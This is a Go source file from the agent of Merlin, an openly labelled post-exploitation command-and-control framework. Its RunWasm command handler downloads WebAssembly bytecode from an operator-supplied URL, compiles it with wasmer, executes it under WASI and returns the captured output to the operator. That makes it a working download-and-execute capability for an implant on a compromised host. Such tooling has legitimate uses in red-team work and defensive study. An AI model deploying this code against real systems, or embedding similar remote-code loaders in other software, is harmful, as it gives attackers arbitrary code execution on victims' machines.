// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/wasmerio/wasmer-go/wasmer"
	// Merlin Main
	"github.com/Ne0nd0g/merlin/pkg/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
)

var engine = wasmer.NewUniversalEngine()
var store = wasmer.NewStore(engine)

// RunWasm runs the provided input program and arguments, returning results in a message base
func RunWasm(cmd jobs.Command) jobs.Results {
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for RunWasmer function: %+v", cmd))
	cli.Message(cli.SUCCESS, fmt.Sprintf("Executing command: %s %s", cmd.Command, cmd.Args))

	var results jobs.Results
	if cmd.Command == "wasm" {
		bytecodeURL := cmd.Args[1]
		resp, err := http.Get(bytecodeURL)
		if err != nil {
			errMsg := fmt.Sprintf("Download Wasm Bytecode Failed, URL: %+v", bytecodeURL)
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}
		defer resp.Body.Close()
		bytecode, err := io.ReadAll(resp.Body)
		if err != nil {
			errMsg := fmt.Sprintf("Read Response Body Failed")
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}
		module, err := wasmer.NewModule(store, bytecode)
		if err != nil {
			errMsg := fmt.Sprintf("Failed to compile module: %+v", err)
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}
		args := cmd.Args[1 : len(cmd.Args)-1]
		wasiEnv, err := wasmer.NewWasiStateBuilder("wasi-program").Argument(strings.Join(args, " ")).CaptureStdout().CaptureStderr().Finalize()
		if err != nil {
			errMsg := fmt.Sprintf("Failed to init Wasi Environment: %+v", err)
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}
		importObject, err := wasiEnv.GenerateImportObject(store, module)
		if err != nil {
			errMsg := fmt.Sprintf("Failed to generate import object(wasiEnv.GenerateImportObject): %+v", err)
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}
		instance, err := wasmer.NewInstance(module, importObject)
		if err != nil {
			errMsg := fmt.Sprintf("Failed to instantiate the module: %+v", err)
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}
		start, err := instance.Exports.GetWasiStartFunction()
		if err != nil {
			errMsg := fmt.Sprintf("Failed to get the wasi start function: %+v", err)
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}

		_, err = start()
		if err != nil {
			errMsg := fmt.Sprintf("Failed to execute the wasi start function: %+v", err)
			cli.Message(cli.WARN, errMsg)
			results.Stderr = errMsg
			goto check
		}
		results.Stdout = string(wasiEnv.ReadStdout())
		results.Stderr = string(wasiEnv.ReadStderr())
	}

check:
	if results.Stderr != "" {
		cli.Message(cli.WARN, fmt.Sprintf("There was an error executing the command: %s %s", cmd.Command, cmd.Args))
		cli.Message(cli.SUCCESS, results.Stdout)
		cli.Message(cli.WARN, fmt.Sprintf("Error: %s", results.Stderr))

	} else {
		cli.Message(cli.SUCCESS, fmt.Sprintf("Command output:\r\n\r\n%s", results.Stdout))
	}

	return results
}
